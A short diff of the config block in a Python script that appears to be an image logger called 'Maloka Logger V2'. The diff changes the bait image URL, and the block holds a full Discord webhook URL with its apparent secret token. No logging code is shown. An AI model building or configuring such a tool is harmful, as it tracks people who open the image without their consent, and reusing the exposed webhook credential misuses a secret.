@@ -10,7 +10,7 @@ __author__ = "YoshiDevs"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1094334971155587192/inUax9d-7gYx29RAQXRR9_GCK3R27Yl6TJIFZxv3S3hDIZUqOy_HFQc5Sp8wQRSC2KCN",
-    "image": "https://imgur.com/bEAPHYO"
+    "image": "https://i.imgur.com/bEAPHYOl.jpg"
     # CUSTOMIZATION #
     "username": "Maloka Logger V2", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
